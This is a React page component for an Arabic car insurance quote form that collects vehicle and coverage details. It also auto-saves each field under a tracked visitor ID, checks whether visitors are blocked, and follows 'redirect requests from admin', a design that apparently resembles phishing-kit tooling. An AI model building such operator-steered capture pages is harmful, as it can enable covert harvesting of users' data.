

import { useEffect, useState } from "react"
import { useLocation } from 'wouter'
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Globe } from 'lucide-react'
import { FullPageLoader } from "@/components/loader"
import { StepIndicator } from "@/components/step-indicator"
import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { addData } from "@/lib/api"
import { translations } from "@/lib/translations"
import { getSelectedVehicle } from "@/lib/vehicle-api"

export default function InsurancePage() {
  const [, navigate] = useLocation()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)
  
  // Form fields
  const [insuranceCoverage, setInsuranceCoverage] = useState("comprehensive")
  const [insuranceStartDate, setInsuranceStartDate] = useState("")
  const [vehicleUsage, setVehicleUsage] = useState("personal")
  const [vehicleValue, setVehicleValue] = useState("")
  const [vehicleYear, setVehicleYear] = useState("2023")
  const [vehicleModel, setVehicleModel] = useState("")
  const [repairLocation, setRepairLocation] = useState("agency")
  
  // Language
  const [language, setLanguage] = useState<"ar" | "en">("ar")
  
  // Auto-save all form data
  useAutoSave({
    visitorId: visitorID,
    pageName: "insur",
    data: {
      insuranceCoverage,
      insuranceStartDate,
      vehicleUsage,
      vehicleValue,
      vehicleYear,
      vehicleModel,
      repairLocation
    }
  })
  
  // Monitor redirect requests from admin
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "insur"
  })
  
  // Initialize on mount
  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID)
      if (blocked) {
        setIsBlocked(true)
        setLoading(false)
        return
      }
      
      await updateVisitorPage(visitorID, "insur", 2)
      setLoading(false)
    }
    
    init()
  }, [visitorID])
  
  // Auto-fill vehicle data from car-bot
  useEffect(() => {
    const vehicleData = getSelectedVehicle()
    if (vehicleData) {
      // تعبئة سنة الصنع والموديل تلقائياً
      setVehicleYear(vehicleData.year.toString())
      setVehicleModel(`${vehicleData.maker} ${vehicleData.model}`)
      console.log('✅ Auto-filled vehicle data:', vehicleData)
    }
  }, [])
  
  // Handle vehicle value input - numbers only
  const handleVehicleValueChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, '') // Remove non-numeric characters
    setVehicleValue(value) // Allow any numeric input, validation happens on submit
  }
  
  // Handle form submit
  const handleSecondStepSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate vehicle value
    const valueNum = parseInt(vehicleValue)
    if (valueNum < 10000 || valueNum > 1000000) {
      alert('قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال')
      return
    }
    
    await addData({
      id: visitorID,
      insuranceCoverage,
      insuranceStartDate,
      vehicleUsage,
      vehicleValue,
      vehicleYear,
      vehicleModel,
      repairLocation,
      currentStep: 3,
      currentPage: "compar",
      insurCompletedAt: new Date().toISOString()
    }).then(() => {
      // Navigate immediately
      navigate('/compar')
    })
  }
  
  if (loading) {
    return <FullPageLoader />
  }
  
  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
          <p className="text-gray-600 mt-2">للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.</p>
        </div>
      </div>
    )
  }
  
  // Generate years from 2000 to 2026
  const years = Array.from({ length: 27 }, (_, i) => 2026 - i) // 2026 down to 2000
  
  return (
    <div className="min-h-screen bg-[#0a4a68]">
      {/* Header */}
      <div className="bg-[#0a4a68] px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-white/10">
        <button 
          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
          className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white/95 rounded-lg hover:bg-white transition-colors shadow-md"
        >
          <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">{language === "ar" ? "EN" : "AR"}</span>
        </button>
        <div className="w-10 h-10 md:w-12 md:h-12 rounded-full bg-white/10 border-2 border-white flex items-center justify-center shadow-md">
          <span className="text-white text-xl md:text-2xl font-bold">B</span>
        </div>
      </div>

      {/* Step Indicator */}
      <div className="bg-[#0a4a68] px-3 py-6 md:px-6 md:py-10 text-center border-b border-white/10">
        <StepIndicator currentStep={2} />
      </div>

      {/* Main Content */}
      <div className="max-w-3xl mx-auto -mt-4 md:-mt-6 px-3 md:px-4 pb-6 md:pb-8">
        <div className="bg-white rounded-xl md:rounded-2xl shadow-xl overflow-hidden">
          <div className="p-4 md:p-6 lg:p-8">
            <h2 className="text-2xl md:text-3xl font-bold text-[#0a4a68] mb-6 md:mb-8 text-center">بيانات التأمين</h2>

            <form onSubmit={handleSecondStepSubmit} className="space-y-4 md:space-y-5" dir={language === "ar" ? "rtl" : "ltr"}>
              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-base md:text-lg">نوع التأمين</label>
                <select
                  value={insuranceCoverage}
                  onChange={(e) => setInsuranceCoverage(e.target.value)}
                  className="w-full h-11 md:h-12 text-right text-base md:text-lg border-2 rounded-lg md:rounded-xl px-3 md:px-4 bg-white focus:border-[#0a4a68] focus:outline-none shadow-sm appearance-none cursor-pointer text-gray-900 font-medium"
                  required
                >
                  <option value="">إختر</option>
                  <option value="comprehensive">شامل</option>
                  <option value="third-party">ضد الغير</option>
                </select>
              </div>

              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-base md:text-lg">تاريخ بدء التأمين</label>
                <input
                  type="date"
                  value={insuranceStartDate}
                  onChange={(e) => setInsuranceStartDate(e.target.value)}
                  className="w-full h-11 md:h-12 text-right text-base md:text-lg border-2 rounded-lg md:rounded-xl px-3 md:px-4 bg-white focus:border-[#0a4a68] focus:outline-none shadow-sm cursor-pointer text-gray-900 font-medium"
                  style={{
                    colorScheme: 'light',
                    direction: 'rtl'
                  }}
                  required
                />
              </div>

              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-base md:text-lg">
                  الغرض من استخدام المركبة
                </label>
                <select
                  value={vehicleUsage}
                  onChange={(e) => setVehicleUsage(e.target.value)}
                  className="w-full h-11 md:h-12 text-right text-base md:text-lg border-2 rounded-lg md:rounded-xl px-3 md:px-4 bg-white focus:border-[#0a4a68] focus:outline-none shadow-sm appearance-none cursor-pointer text-gray-900 font-medium"
                  required
                >
                  <option value="">إختر</option>
                  <option value="personal">شخصي</option>
                  <option value="commercial">تجاري</option>
                  <option value="passenger-transport">نقل ركاب</option>
                  <option value="rental">تأجير</option>
                  <option value="cargo-transport">نقل بضائع</option>
                  <option value="freight-vehicle">مركبة شحن</option>
                  <option value="oil-transport">نقل مشتقات نفطية</option>
                </select>
              </div>

              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-base md:text-lg">
                  القيمة التقديرية للمركبة
                </label>
                <Input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder="أدخل القيمة بين 10,000 - 1,000,000 ريال"
                  value={vehicleValue}
                  onChange={handleVehicleValueChange}
                  className="h-11 md:h-12 text-right text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium"
                  dir="rtl"
                  required
                  min="10000"
                  max="1000000"
                />
                <p className="text-sm text-gray-500 text-right">القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال</p>
              </div>

              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-base md:text-lg">سنة صنع المركبة</label>
                <select
                  value={vehicleYear}
                  onChange={(e) => setVehicleYear(e.target.value)}
                  className="w-full h-11 md:h-12 text-right text-base md:text-lg border-2 rounded-lg md:rounded-xl px-3 md:px-4 bg-white focus:border-[#0a4a68] focus:outline-none shadow-sm appearance-none cursor-pointer text-gray-900 font-medium"
                  required
                >
                  <option value="">إختر</option>
                  {years.map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
              </div>

              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-base md:text-lg">ماركة وموديل السيارة</label>
                <Input
                  placeholder="مثال: تويوتا كامري 2023"
                  value={vehicleModel}
                  onChange={(e) => setVehicleModel(e.target.value)}
                  className="h-11 md:h-12 text-right text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium"
                  dir="rtl"
                  required
                />
              </div>

              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-base md:text-lg">مكان اصلاح المركبة</label>
                <div className="space-y-2 md:space-y-3">
                  <label className="flex items-center gap-2 md:gap-3 p-3 md:p-4 border-2 rounded-lg md:rounded-xl cursor-pointer hover:bg-gray-50 transition-colors">
                    <input
                      type="radio"
                      name="repairLocation"
                      value="agency"
                      checked={repairLocation === "agency"}
                      onChange={(e) => setRepairLocation(e.target.value)}
                      className="w-4 h-4 md:w-5 md:h-5 text-blue-600 focus:ring-2 focus:ring-blue-500"
                    />
                    <span className="text-sm md:text-base font-medium">الوكالة</span>
                  </label>
                  <label className="flex items-center gap-2 md:gap-3 p-3 md:p-4 border-2 rounded-lg md:rounded-xl cursor-pointer hover:bg-gray-50 transition-colors">
                    <input
                      type="radio"
                      name="repairLocation"
                      value="workshop"
                      checked={repairLocation === "workshop"}
                      onChange={(e) => setRepairLocation(e.target.value)}
                      className="w-4 h-4 md:w-5 md:h-5 text-blue-600 focus:ring-2 focus:ring-blue-500"
                    />
                    <span className="text-sm md:text-base font-medium">الورشة</span>
                  </label>
                </div>
              </div>

              <Button
                type="submit"
                className="w-full h-12 md:h-14 bg-yellow-500 hover:bg-yellow-600 text-[#0a4a68] font-bold text-base md:text-lg rounded-lg md:rounded-xl shadow-lg hover:shadow-xl transition-all"
              >
                إظهار العروض
              </Button>
            </form>
          </div>
        </div>
      </div>


    </div>
  )
}
